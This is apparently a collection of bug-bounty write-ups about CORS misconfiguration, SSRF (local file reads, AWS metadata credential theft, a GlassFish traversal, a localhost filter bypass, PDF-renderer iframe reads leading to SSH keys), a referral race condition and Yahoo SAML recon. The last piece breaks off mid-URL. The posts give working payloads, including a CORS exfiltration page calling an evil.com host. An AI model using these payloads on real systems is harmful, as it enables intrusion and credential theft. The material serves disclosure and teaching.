'/cors-poc') { fs.readFile('cors.html', function(err, data) { res.writeHead(200, {'Content-Type':'text/html'}); res.write(data); res.end(); }); } else { res.writeHead(200, {'Content-Type':'text/html'}); res.write('never gonna give you up...'); res.end(); } }).listen(port, '0.0.0.0'); console.log(`Serving on port ${port}`); 3. In the same directory, save the following: cors.html <!DOCTYPE html> <html> <head><title>CORS</title></head> <body onload=\"cors();\"> <center> cors proof-of-concept:<br><br> <textarea rows=\"10\" cols=\"60\" id=\"pwnz\"> </textarea><br> </div> <script> function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById(\"pwnz\").innerHTML = this.responseText; } }; xhttp.open(\"GET\", \" https:// client.amplifi.com /api/user/ \", true); xhttp.withCredentials = true; xhttp.send(); } </script> 4. Start the NodeJS server by running the following command: node serve.js & 5. Now, sign in to the application on: https://protect.ubnt.com/ , and check that you can retrieve your account information from the endpoint: https://client.amplifi.com/api/user/ 6. Finally, open the link: https://zzzz.ubnt.com=.evil.com /cors-poc In Safari Browser, And Voilà. In my case I used the Safari browser in my iPhone as PoC, since I don’t have a Mac machine. Press enter or click to view image in full size Reward Press enter or click to view image in full size Takeaway I’m sure that a lot of security researcher had already been in such situation, and you can find lots of report in HackerOne describing this type of CORS misconfiguration, but only a few were able to fully exploited it, due to lack of a PoC in their report. That’s one of the reasons why I wanted to share my experience. also to highlight other techniques to exploit such vulnerability. Finally, Always remember, Sometimes you just need to think outside the ̶B̶o̶x̶ Scope. Thanks for reading. Feel free to follow me on Twitter https://twitter.com/sandh0t Happy Hunting.

SSRF Actions apply on different approaches depending on where you are looking for SSRF. what are some SSRF Actions >> Abuse the trust relationship between the vulnerable server and others. Bypass IP whitelisting. Bypass host-based authentication services. Read resources which are not accessible to the public. Scan the internal network to which the server is connected. Read files from the web server. View Status Pages and interact with APIs as the web server. Retrieve sensitive information such as the IP address of a web server behind a reverse proxy.

Previously I wrote a blog post about the payment bypass bug which i founded on a Program and i Received lot of positive feedback so it motivated me to share one more findings with the community .If you haven’t read that blog you can read it by following this link . So lets talk about the bug :- Firstly I crawled and manually performed all the operations as a user on that application . And after that i checked every possible request on burp http history and Frankly saying i was looking out for a url redirection Vulnerability . So i Searched on Burp of possible parameters of url= And ended up with a url which basically was something like this https://example.com/viewimage/?url= Aws image location(stored and loaded from aws ) So This endpoint was basically loading the image that i uploaded on the site and my image was stored on aws bucket . As we have got a clear idea that it is loading content. Why not to load content from other domain ? Try RFI ? Steps that i followed:- Trying Xss :)(Failed) Firstly I tried to get a Xss .So i have read many blog about getting a xss . All I did is Simply added http://brutelogic.com.br/poc.svg in the url . So the Final crafted url was like https://example.com/viewimage/?url= http://brutelogic.com.br/poc.svg . So I Visited the url but it was not loading the content but a simple text file gets downloaded And it was having nothing in it. Trying to Read Local Files (Success) Next I tried URL schemas to read internal and make server perform actions ( file:/// , dict:// , ftp:// , gopher:// ..) So the final crafted url was https://example.com/viewimage/?url=file :///etc/passwd And Again a Text File gets downloaded like Press enter or click to view image in full size So When I checked the Text File which was downloaded I was bit surprised by seeing the content of the text file. It Was content of etc/passwd Press enter or click to view image in full size Escalating it More :) Now as I have seen this site was loading images from aws . So i Thought why not to extract internal AWS metadata. Reading Aws EC2 Metadata I replaced the url parameter by To view all categories of instance metadata from within a running instance, use the following URI: http://169.254.169.254/latest/meta-data So the Final crafted url https://example.com/viewimage/?url =http://169.254.169.254/latest/meta-data Now as expected it again downloaded a Txt file and after viewing. it showed below information Press enter or click to view image in full size 4. Now Reading Secrets to Make it more critical :) to rain aws access key , secretaccess key simply i appended this url in the parameter in http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role And it rained the secret access key , token ,region ,etc. So now using aws client I can export this details and could have get access :) Simply This bug allowed me to achieve RCE using a SSRF Vulnerability . To Read More about escalating it After getting the secret key etc you can follow this blog https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/ “Secondly I would like to Thanks ENCIPHERS Team for Training which i attended in Delhi And it was Beautifully conducted by Abhinav mishra , Narendra and abhishek Specially for Creating the Vulnerable application . And the SSRF challenge was same as that I founded in This private program” Now what everyone looks for In Blog Post :)(Bounty) Reported the vulnerability to the program via There BB Program Within a Day I received the message that Bug was fixed and they rewarded Me with 4 Digit $ Bounty and also Bonus But however they where not so happy with me because i escalated it more than enough just to demonstrate and they revoked the credentials :) Thanks Hope you liked my blog post , Please do share this :) Pratik Yadav AWS Bug Bounty Infosecurity Infosec -- -- 3 Written by pratik yadav 620 followers · 71 following Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

Here’s the full content:\n\nhome bug_bounty_writeups box_writeups DownNotifier SSRF Apr 4, 2019 • bug_hunting , bug_writeup , openbugbounty downnotifer.com SSRF Bug Writeup i. Introduction DownNotifier has an open bug bounty progam hosted on https://openbugbounty.org . DownNotifie is a service which periodically scans your websites and notifies you if your website has gone down. Due to the nature of the website and the service it provides, I thought about some application logic bugs which might work, So in mind came SSRF . ii. SSRF Explanation SSRF, sometimes prounced Surf , stands for Server Side Request Forgery. Essentially, with SSRF you are able to send requests originating from the web-server, in which you can leverage to read local files, or even enumerate services on the local system. Within SSRF, exists a subattack you can perform which is known as XSPA (Cross Site Port Attack) With XSPA , you can use server output (which was easier for us in this case), or server response times to fingerprint if local services are running on the server such as ftp, mysql, redis iii. Exploiting XSPA to Enumerate Local Services When browsing to downnotifier we are greeted with: Trying usual loopback addresses like localhost and 127.0.0.1 does not seem to work too well: Also trying to grab files using file:// turned out as expected: I tried some more payloads I found from PayloadAllThings SSRF payload page and found that 0.0.0.0 seemed to be accepted. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery Though, even if it bypassed the filter, will it still work? To see if it would, I added some common ports. 30 seconds later, we can see that we indeed did get an SSRF and were able to enumerate local services. ftp and http are running. iv. Conclusion I reported the bug to DownNotifier and within 24 hour hours there was a response & a patch. I would like to thank DownNotifier for the acknowledgement and the quick patch. Thank you for reading, mqt Sources: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Request Forgery"}

Avinash Jain (@logicbomb) 5 min read · Apr 25, 2019 -- 7 Listen Share Hi Guys, Back with an interesting hack that I was eagerly waiting to get the writeup to publish. This hack is about a chain of vulnerabilities which includes multiple bypasses in a various different layer which finally lead to access of AWS credentials in India’s biggest stock broker company . Below I’ll explain how I was able to access AWS credentials by first bypassing Web application firewall (WAF) and then leveraged it to SSRF via bypassing Web cache mechanism and finally gets hold of AWS account credentials. (This was done with the explicit permission of the concerned company) D uring the first phase of testing, I found an endpoint which was interacting with some file system so I went ahead to check for LFI (local file inclusion) vulnerability and found that application was behind the Cloudflare firewall — Press enter or click to view image in full size Cloudflare WAF Now to basically bypass the firewall, I had to directly send my request to the origin server hoping that they don’t have whitelisting of IPs request coming to their servers or load balancers — Press enter or click to view image in full size Scenario of usual request call In order to find the origin server IP, I simply ran “dig www.readacted.com” and I had the origin server IP — Press enter or click to view image in full size Following article can help understand by digging the domain gave the origin server ip — https://support.cloudflare.com/hc/en-us/articles/115003687931-Warning-about-exposing-your-origin-IP-address-via-DNS-records and then I simply made the entry in the host file and tried the LFI to read /etc/passwd and below is what I got as the response — Press enter or click to view image in full size Sample Redacted Image So, I managed to bypass the firewall and able to execute LFI vulnerability. When I searched the IP for the whois information, I found that the IP belongs to AWS. Now the next target was to read AWS account credentials by exploiting SSRF vulnerability which I was hoping it would definitely be there because of the designated functionality of the page/URL so without wasting any time, I proceeded to make the API call to read AWS instance metadata ( http://169.254.169.254/latest/meta-data/ )— Press enter or click to view image in full size HTTP Request to read AWS instance metadata HTTP/1.1 200 OK Server: nginx Date: Fri, 06 Apr 2019 14:32:48 GMT Content-Type: text/css;charset=UTF-8 Connection: close Vary: Accept-Encoding Strict-Transport-Security: max-age=15552000 X-Frame-Options: DENY X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block X-Proxy-Cache : HIT Content-Length: 0 But the response was empty with 200 OK response which meant that it surely interacted with the API and then returned the empty response. But why the response was empty? If you look at the above image, you will find the server header as a “ Nginx ” and response header “ X-Proxy-Cache ” which was set by Nginx cache layer whose value was set as “HIT” which meant that when the client tried to access the AWS metadata API, it first hit the Nginx cache layer and gave the response from the cache which was empty. Now basically to get the response from the server, I had to bypass the cache layer for which firstly I needed to understand how URL caching paging rule are made in the nginx caching system. Some references — https://www.digitalocean.com/community/tutorials/how-to-implement-browser-caching-with-nginx-s-header-module-on-centos-7 https://www.howtoforge.com/make-browsers-cache-static-files-on-nginx What I understood is that general caching is done on the URL route path basis so if the URL is https://somewebsite.com/a.html and if it matches the route path (which it will because of caching rule) then it would hit the cache but if the URL is https://somewebsite.com/a.html? then the URL route path will not get matched with the caching rule hence it would miss the cache and get the response from the server. So I proceeded to make the call to read AWS instance metadata API ending with ? or any other special character, not matching the URL route path set in the caching rule( http://169.254.169.254/latest/meta-data? ) and below is the response I got — Press enter or click to view image in full size Web Cache Bypass HTTP Request to access AWS instance metadata HTTP/1.1 200 OK Server: nginx Date: Fri, 06 Apr 2019 14:32:48 GMT Content-Type: text/css;charset=UTF-8 Connection: close Vary: Accept-Encoding Strict-Transport-Security: max-age=15552000 X-Frame-Options: DENY X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block X-Proxy-Cache : MISS Content-Length: 315 ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hostname identity-credentials/ instance-action instance-id instance-type local-hostname local-ipv4 mac metrics/ network/ placement/ product-codes profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/ If you see the “ X-Proxy-Cache ” cache header value, it is now set to “MISS” which meant that now the API call doesn’t hit the caching layer and it fetches the response directly from the server. So I was able to successfully bypass the caching layer to exploit SSRF. Now to read AWS account credentials, I had to make the call to AWS instance metadata security credentials API ( http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance? ) and as I expected, I was able to get hold of it — Press enter or click to view image in full size I got the AWS access ID, secret Access key and the token and using which I was able to login into their AWS account and was able to access plenty of critical stuff. So having first bypassed the Cloudflare firewall, I exploited LFI then escalated it to SSRF by bypassing web cache mechanism and finally I got hold of AWS account credentials by exploiting SSRF vulnerability. So, that’s it about this interesting finding!:) Report details- 06-April-2019 — Bug reported to the concerned company. 07-April-2019 — Bug was marked fixed. 07-April-2019 — Re-tested and confirmed the fix. 09-April-2019 — Rewarded.

While testing an application I have identified that an application is using the PDFReacter parser. PDFReacter is a formatting processor that parses the HTML content to PDF files.so Since an application has an option to insert data into forms, I started fuzzing with XSS and for that, I simply used <img> tag. there was an option to export the forms to PDF and when I exported the one of the form which has the payload, the final PDF file was like this. Press enter or click to view image in full size This means an application and PDFReacter both do not escapes the HTML tags and processes the HTML tags/XSS Payloads as well. Since I knew that an application is using PDFReacter as a parser and both application and parsers are not escaping my payloads. So the next was with the iframe. I wanted to check if I can load external sites in a final pdf document or not and as you can see that Google is getting loaded in the frame. Press enter or click to view image in full size Now it was clear that I can hit to the external sites by using iframe(SSRF Confirmed). Next step was to read the local files with file:/// wrapper.Simple Payload “><iframe src=”file:///etc/passwd”/></iframe> I used for it. Press enter or click to view image in full size Bang !!!!! Next is to check if the current user has root privileges or not. I Simply tried fetching the shadow file with the below-mentioned payload and I noticed that I was able to fetch the shadow file. “/><iframe src=”file:///etc/shadow”></iframe> Since the Current user has the root privileges, Next was to pop a shell, I Fetched Private SSH keys, And was able to SSH to the server. Press enter or click to view image in full size Although it was not my first RCE, I got goosebumps when I popped the shell. Rahul Maini’s blog helped me a lot to understand the current scenario.

Zain Sabahat 3 min read · Nov 22, 2018 -- 3 Listen Share Hi Guys! Greetings everyone! Today I am doing another write-up about one of my best findings. It’s an SSRF — Server Side Request Forgery vulnerability I discovered in a private program. In the scope page, the program had few IPs with only Server-Side bugs acceptable in its scope. I picked an IP and started my recon process on it. I found a subdomain https://help.redacted.com hosted on that IP through Reverse IP scan. I used HackerTarget’s Reverse IP lookup tool “ http://api.hackertarget.com/reverseiplookup/?q= {IP}” The subdomain was running a Jira instance. I quickly remembered the Alyssa Herrera ’s article about SSRF Exploitation in Jira instances. I checked the version of the Jira and it seems vulnerable to the SSRF. https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com Press enter or click to view image in full size Successfully rendered google.com and verified the existence of SSRF. Now I was able to render any webpage through that vulnerable endpoint or I could have converted it into XSS by loading an external page but as I have told earlier that the company was only interested in Server-Side and network related issues so I had to dig more. None of the protocols i.e. gopher:// , file:// , ldap:// or ftp:// were working except http:// . It was an azure instance so I tried to fetch the metadata file of the instance from the uri: https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri= http://169.254.169.254/metadata/v1/maintenance but I got nothing but a blank JSON response. Now I needed to think out of the box. I started playing with the endpoint. I tried to load localhost (127.0.0.1) from the uri and it loaded the main page. An idea clicked in my mind that there might be some services were left running on internal ports. I started by the most common port 8080. And then as I thought, I was welcomed by GlassFish server’s default page. Press enter or click to view image in full size After seeing that I quickly reached to the default administration console at Port 4848 . It was the login page of GlassFish server. Press enter or click to view image in full size Sourcecode of GlassFish Administration Console at Port 4848. I searched for the GlassFish exploits and hopefully, I found a GET based exploit: “ https://www.exploit-db.com/exploits/39241/ ” Press enter or click to view image in full size GlassFish Exploit — Read Server Files I crafted that payload: https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri= http:// 127.0.0.1:4848/ theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd But it didn't work!! I got really disappointed and I was about to give up. But then I just noticed that there is url-encoding in that exploit and when it is passed through the browser it gets decoded so I may need to double encode it to pass the correct request on to the GlassFish server. And our final payload was: https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:4848/theme/META-INF%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2fetc%2fpasswd Press enter or click to view image in full size Successfully read the /etc/passwd file. And resultantly, this simple HTTP-Protocol based SSRF was escalated to a local file read by exploiting an internal service. Kudos to Shawar Khan and HassanKhanYusufzai for helping me to escalate this SSRF to a whole new level. Timeline: November 12, 2018 — Reported. November 12, 2018 — Triaged.

While I was looking for a few things about BugBounty, I found a report where the author talked about an SSRF which he had found in Bing’s Webmaster Central, and reported to Microsoft. In the Bug it describes that it was able to list internal ports and the services of that application. More info on: https://blog.0daylabs[.]com/2015/08/09/SSRF-in-Microsoft-bing/ Seeing this I thought “What if I try a new bypass on this fix?”, I like challenges, so I opened my browser and started testing. Press enter or click to view image in full size First I tried a list of payloads that resolved to ‘127.0.0.1’, but their filter did not allow those addresses. Press enter or click to view image in full size As they were blocking access via the address ‘127.0.0.1’, and also registering ip addresses, I used the “.nip.io” domain to be able to bypass that first check along with the ip ‘127.127.127.127’. 127.127.127.127.nip.io Press enter or click to view image in full size Press enter or click to view image in full size It was enough to deduce that I had been able to access their local address. Note that with “127.127.127.127” it does a redirect to “/toolbox/webmaster/” After that I tried to access a nonexistent directory, to check the server responses. Press enter or click to view image in full size Conclusion: Setting up a domain to resolve the address ‘127.127.127.127’ I was able to bypass the old fix, list internal ports and directories in the local address of Bing Webmaster, sometimes many administrative panels are configured to be accessed only locally, which could be found by scanning directories through this SSRF.

It located on a website from a private program X on Hackerone. That website has an API, allows users input their URL and email. In the backend, there is a simulated browser, which tries to open that URL and send the screenshot to user’s email. Actually, I don’t have any idea about that simulated browser, not sure if it is a real one or not. First thing, I inject a requestb.in URL, and the received User-Agent is Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 Personally, I am interested in SSRF bug, and this case I have the response, so, I thought that I might have some funs. After the requestb.in URL, I tried my luck with: http://localhost http://0 http://127.0.0.1 https://localhost http://localhost:8080 http://192.168.0.1 The server accepts these URL, open it and send the result to my inbox. But the received responses are Err: timeout for almost times. The hard thing is the limited number of URLs to be inputted. So, I couldn’t do the brute-force to test Boolean-based. OK. Now is the time for the local file: file:/// file:///etc/passwd file:///c/ chrome://about about:addons These above payloads had been used to injected as URLs. However, this time, the server stopped me and said that they are invalid URLs. I paused when there are not any ideas in my head. That night, after a cup of Asahi beer, I decided to brainstorm again. Is there anything else that I forgot? Oh, http ? Yes. file ? Yes. chrome ? Yes…. How about other services? ftp ? Promptly, ftp://example.com has been inserted. It worked. Then, I was confused about which keyword had been filtered on the server. I replaced ftp by file , and it worked also. How so? Yes. The problem is /// , we only need a couple of / , if there are more than, the server would think it is an invalid URL. Then, I tried with file:// . Press enter or click to view image in full size Index of page was in the response. Awesome! Then, how about /etc/passwd ? Hmm. The URL would be: file://s/etc/passwd Press enter or click to view image in full size Awesome, again!!! And that is my PoC. I submitted the report to that program; unfortunately, they fixed and said that they aware of that issue and closed as Informative. Actually, I still don’t really understand that decision, however, I don’t want to argue with triggers, then, it should be fine. — If you like my sharing, please consider buying me a coffee . ☕️ Security Bug Hackerone Ssrf Bugbounty -- -- 5 Written by Tung Pun 186 followers · 61 following Hey 👋I’m Tung Pun.

DownNotifier is an online tool to monitor a website downtime. This tool sends an alert to registered email and sms when the website is down. DownNotifier has a BBP on Openbugbounty, so I decided to take a look on https://www.downnotifier.com . When I browsed to the website, I noticed a text field for URL and SSRF vulnerability quickly came to mind. Getting XSPA The first thing to do is add http:127.0.0.1:22 on “Website URL” field. Select “When the site does not contain a specific text” and write any random text. I sent that request and two emails arrived in my mailbox a few minutes later. The first to alert that a website is being monitored and the second to alert that the website is down but with the response inside an html file. And what is the response…? Getting Local File Read I was excited but that’s not enough to fetch very sensitive data, so I tried the same process but with some uri schemes as file, ldap, gopher, ftp, ssh, but it didn’t work. I was thinking how to bypass that filter and remembered a write-up mentioning a bypass using a redirect with Location header in a PHP file hosted on your own domain. I hosted a php file with the above code and the same process registering a website to monitor. A few minutes later an email arrived at the mailbox with an html file. And the response was… I reported the SSRF to DownNotifier support and they fixed the bug very fast. I want to thank the DownNotifier support because they were very kind in our communication and allowed me to publish this write-up. I also want to thank the bug bounty hunter who wrote the write-up where he used the redirect technique with the Location header.

In a race the one who cross the finishing line 1st becomes 1st. Ever thought if all the participants completes the finishing line at the same time. Sounds nice… But is it practical in a real life scenario ? That’s the interesting part. What is race condition? A race condition occurs when multiple threads can access shared data and they try to change it at the same time. Because the thread scheduling algorithm can swap between threads at any time, you don’t know the order in which the threads will attempt to access the shared data. Therefore, the result of the change in data is dependent on the thread scheduling algorithm, i.e. both threads are “racing” to access/change the data. Let’s take an example to understand this scenario . Concurrency in go that can lead condition Here 2 goroutines are fired and they are provided a simple task just to initialize in a value in “value” variable and increment & print that value. Finally when both goroutines complete , the value of “counter” variable should print. Expectations : The expected output should be output of the current example code Yes , we got as expected . But wait a moment, hit the same code multiple times and observe the output. Press enter or click to view image in full size The same code when hit multiple times Now we understood what exactly is the problem. Both the goroutines are trying to access the same memory location simultaneously . Although this issue can be resolved simply by adding mutexes to handle this concurrency. But here we are highly interested on how this race condition can be useful for an attacker . Where Can I look for such scenario ? Bug hunting is all about understanding the flow of a web application or a mobile application. The more you understand the target, the easier will be to exploit that as well. The critical sections that can be vulnerable to such type of scenario where two or more sources tries to access the same resource. The most common attack vectors are the section which contains coupon code, invite code, or any other data that can be used only once for a particular user. well this makes sense now….. Press enter or click to view image in full size How I found a similar bug in a bug bounty program! So, I was looking in a public program that was present for a long time in Bugcowd. I started with the recon phase. While my recon was in background I was observing the functionalities and behavior of that web app . There was a section on invite friends as this feature comes now in most of the companies . I was interested in what will happen if I invite some friends. They had multiple rewards for this depending upon the country . Like there was one option for UK , whenever a user invites 3 friends and they spend 200 GBP (each) . The user who invited them will get a reward of 50GBP(pounds). How this invite works? while inviting I saw 2 options Invite through link Invite through coupon code I thought let’s play with the coupon code . Here an idea came in my mind how about the friend I’ve invited hits the coupon code again and again & server accepts those requests but I can see user can hit these code only once. Then I thought to look for race condition, but how this can help here? Suppose I have invited 18 users so when these 18 users will spend 200GBP each (i.e 18*200 = 3600GBP) , I’ll get 50GBP for each 3 users(i.e 6*50=300GBP) . Time to attack Requirements : Two user accounts (user1 , user2) Turbo Intruder (BurpSuite’s plugin) Turbo Intruder is way much powerful tool that has the ability to send 30,000 requests per sec If it is configured in that way. For installation and usage of turbo intruder , I’ve found the perfect tutorial here : https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack From user1 account I took the invite coupon. There was an option in profile if you forget to enter your invite code while signup then you also have an option to enter it afterwards. So, I sign up with the user2 account and went to the section to enter invite code, that I’ve copied from user1 account. Then I entered that coupon code and captured that request in Burp proxy. In the body section I can see the request like this {“referralToken”:”invitecode”} Double click on the invite code to select and send the request to turbo intruder Then I could see the request like this POST /gateway/v1/virality/guests/18343692/referrals HTTP/1.1 Host: example.com User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 . . Cookie: {cookie_value} {“referralToken”:”%s”} As we can notice, turbo intruder set the selected invite code as %s Turbo intruder supports the python script to configure and run the request as we want. I hit the script in script section. Turbo Intruder script Run the attack We can see there are around multiple responses that has 200 status code and rest 40x Turbo intruder attack Now to confirm if these requests are accepted by the server and invitation reflects in the user1’s profile. I switched in the user1 account and checked my invited users . user1 profile Yes, the race condition vulnerability was exploited successfully. Now the Impact As we can see user1 has invited user2 multiple times (Let’s say 18) . So when user2 will spend 200GBP , here all the 18users are same (u1,u2…u18=user2) user 1 will get 50*6=300GBP(i.e 50*{total_invite/3}).

As mentioned publicly Yahoo! Guesthouse is a set of administration tools used by Yahoo! on a daily basis. They allow Yahoo! administrators to control all aspects of the Yahoo! network, from mail and hosting accounts to server settings and hosting management. Certain parts of the system, such as error reporting tools, are also available to Yahoo!’s customer services team. If you hunt a lot in yahoo you will notice that when you try to open some subdomains in browser you will be redirected to yahoo gueshose login page where you should enter a username and a password related to yahoo employees and then you will be redirected to the subdomain you are trying to reach as per the below : Press enter or click to view image in full size Yahoo Guesthouse login page I remember that i did scan that before, tried alot to search for vulenrable endpoints, hidden folders/files and couldn't achieve anything out of it, and obviously i don't have credentials to login,but working on another subdomain helped me finding the vulnerable endpoint in that target. Recon : so during my normal recon for yahoo i found that target https://alpha.keyserver.yahoo.com/ when you open it you will get not found response as per the below : Ok, challenge accepted :) so doing dirsearch took time in that target and result was great, i found a SAML endpoint https://alpha.keyserver.yahoo.com/saml that redirected me to the Yahoo Guesthouse login page i mentioned, but new thing appeared :D, it says after successful login you will be redirected to to a SAML endpoint , the endpoint was new to me in yahoo Guesthouse as per the below : See the redirected to path So doing view source to the page i was able to see the full endpoints which is : https://gh.bouncer.login.yahoo.com/simplesaml/saml2/idp/SSOService.php?SAMLRequest=nFjXkuJI073vpyDYS6JbBgkkYnu%2BkAMECJCQkLmTKXmHSv7p%2F4Aew8zO9r%2B7Vx1deTLrZObJLODP%2F%2FVZOmlBBaMif59ib%2Bh0AnK38KI8eJ9q6vqVmv7vy8uf0M5SvFwxTR3mCrg1ANaTPktzuPqwvE%2BbKl8VNozgKrczAFe1u7ow0mGFv6Grsirqwi3S6ZPP5x42hKCqoyJ%2FdoFR8D4N67pcIUjXdW%2Fd%2FK2oAgRHURRBaaTPUg9GwR%2FTici%2FT5cegTqe573SzsJ7peZL9BUA23ulaYDhPrW0F%2BhiOrl%2Byxy%2FZ37%2BypON8o8CfEbR%2BQDB1VZVz6%2Fn00WdTphvtLkih00Gqguo2sgFmnL4YA5XCGKnZWi%2FJWCAoGpB9TbYYVG8uUW2Iog58kgUFtMJD2Ad5Xb9oPfNNwjfnKLJXVC9pUUQ5T%2BcERhlZQru7o8YOBJ5JXK5nL5SeCvDcjpZF5ULHl18n%2Fp2CsF0IkLYADGHtZ3X71McxZavKPWKkipGrnBqRc7f5jSNzlEKm1t%2Fn6GYe6B%2Fn6LTCVPXVeQ0NfhARHnwK%2BTLy2QymXxoavW4vnoW0z9Vxpd%2FVdA%2Fkef7nimUq6OdAZE%2FF2nkDhMmTYuOq4Bdg%2FdpXTXgUbXMrj%2FndT%2BJvFf%2FAV3VlZ3DCOT1FPn5qq%2FDA7xHE7gir0H%2F30aJK7LSriJ4lwfobbf%2BWtfvt62er%2BBSG0IF%2BP9hAr98CnNX7j00gKuzDWFXVN59ioBbA0%2B9F6Esqvqj9r%2Fl87U6yGfleaogjILVJQpyu24qMBG99%2Bn3%2F7Bf8%2F%2BGBZ6Y%2B8UP408Azs6LPHLtNBofoyaBOiy8CZMGRRXVYfY3CwdDMPS%2BcF5B7766GJH%2F8a3Rv6XwIPgPQ%2F%2B0yypov8LQxv42ugJ8UIHcBRNNEd%2Bnf%2FyjtfdzrJ%2FiPXp2FzH8K%2Bj3wH%2BXEMhbkBYl8F7ht7r8mtsPQfx%2FhL6T4aMAwPq%2FFPh3xf1N6KudNuCLVHcSrrazIFCOurlAuxTwhNIimhe8%2F2D87PHy%2B6S%2Bd%2B1Jsshnmv2rmj7iX8du4AUTm0WZgeqjNA9D76Ag%2FTkOjzKUJP4mRUlyvZ2o%2BdJvFrHI4OBISSYu9Kp6sr2XERyos0OdttZtxwo7fMssS3KxhgRdJhW%2FH%2FryjN2o%2BtJzSeNUxYZWuyAt8nGZ8l7rWu6L44472C8Mut8ruFnqRqni5ZgTokGAdbrbjXw66pdZKaTKFjuDdpHwRmjvoZUfPQuljRdtnDVXbGAa9DyeWd3ZCRHtO7Lf7RskOG4a%2FQDoOKKJRrCWF3YXLReO4HvD2Wi1ZUzK7At%2BdOmU6G9JEHJbhp7HPuLgxKItC4KaASBJBkftTSde81h9KeUNxurIheZ8wjycotCyXuCaNhaR4zG7JbcMh03a7cz%2BclTymJebkciKhTsS3sw%2F5JTYCTecUKOIznBrPhud%2FeKkvsgBx2DRRXQv2lhWXnZp3dhOdMclrTRPl8oFENsyCdaLiDAZdLdRHVNOoy2x3m%2BGUoypl722hsORCYk0QwuTIqlD1eLQ2Q59nni2V2On075VSr1BiGS0lxLfJVej0azlbUnuzjH6UojoGW2afdR1g2ZRrnSuJYrcSgdotVVf3NjqqBOXMFyva9%2FBI99OeKRkWYegSz%2Br0vaFuuGojRS3pKC3Ob6%2BDIfTooluBYZ32S2mNCq3zzPmvBtK0TscelVlMHrRBMCKt6OZGOVLMwPn0h8R9wApvEFughoEveck47gndL3Jig2H4wLuZKL5%2FrPWn%2BT8V73vwfDJ9jZIlObt2v5kfu8Q7v6S%2BZFr1%2BCLJIpCwnMcM48CphNZJhA5IZY7XjZ3%2B8ISw9Y9MrJwYGWmC0y050ZmxwbHK8uYKpNeVUmROkE2%2Bassi0JX8qbel1ZGD06WhpIidgLzsG2FLlU9nWyAYYXORuuFkVE%2B4hQql6ahvaFbUUgbcyD67ch4HzaorpO0ecTT16it0424VlITDxsH71trnjxhJXWd7VpPJ2PL2I2mjsFDfkydjTXautdYutxtQ%2FcoqWZ3UkX88ZeXMf1%2BFgvdiZf672cxS0oy7LiPvDZCt7tqo6BKrLBhME3gWGkv42to61brZmRpqk%2B2UNrr%2BrpwcCq46GR8iAVfYtEPWy%2FpF53MnPmuNg2ldHAiuG6usb0hW2dD50D9gWV6STczGnOyY%2Brmx9DRu8bFr%2Fc9UVo4mVr3nl3EX%2FvEsjLDB4FwZu52ueCCQGAZyScNnwPi3mAS%2B1awR3shp%2B7C5sfIa4KLEC4lpzq1qujlRaTeDGVkvMgoNO6UMXkeooWGbvKhE9ett8CKY2hoB7Rq3bxlzzEfS0lTEmv36g7nTKWILsOyZjO6zsZAaY0jrP1NJnvb5lTW4bbH8Hh2ySTjD5cjDW0wdKlMEr3m%2BYt6f8Os2ZalKOZoisuDB%2FpjKBG935OukHhDQVOyX7Gz4raReJ2mtO2JFXfHxYFpJFpeurmXEPtNhKAhOJlMiVTNyTP5BTKkNcKqekgubok6P6B2wOnqSbSAjBJb1G2HgFzozca6ZGrltzPqFhQCJRZbn%2BJqZx6whEcYsm84hXdGEGKhL%2B25sL3RKMd0AsPYJ46RYRcEwlZiknvvPKGTOYlhugNj7kzREhnTIeRAOLIspW81urN0UtXQLlDwa2MZu9DbXBNRuPdZKa0sjU1DSb%2FqwOMDWWdZxTgyJ0ggw6gZUijfMovhBbO%2BhV4Vc2x1nzEFjVlxk0jiJizMjVqKG1kSN8d%2FqeOLxDIPG9tLO21%2BbZw8xU29T5%2FmfC90pWXqYesM7M7JpEZSqG77YTsIvbVzsns8LPQ2aetErGbpx8LJaOjgHvmE5YXeipz5tTHx6%2BDi69rhyNHS%2B8zF09zJrkkQJEy5Za%2Fs7KxokPndTuIf%2Bhb2g41dm1N2jfy2DYw4Ol1CdgCXDukP%2BgD2JCnKZX4ZUJPYyki2PmOKcE3wECpByt7q8pCs9%2Fu1Chp7JlehWMaX0kPWh0a0jC7a7uHoioKeh1ony9XGinzzbOaKCOzkcIKFY6mxQmJ0GwZiy1pavrs6veb2B%2FcMpYQ%2BHQjBxWUIGeR2kVPdyRfSzoiH09kT93CBdxikF5raIgl69LZ2FKdk0wSqIXutrx8dq8HWtN1ZXVG7LSH6DiPRCmjcthyGWChzrFqM%2FSAuCgq1LU9po9qRQubgjEHV4jprNfN0js3m5G3Dr7c9lFAMD12e9kae1bj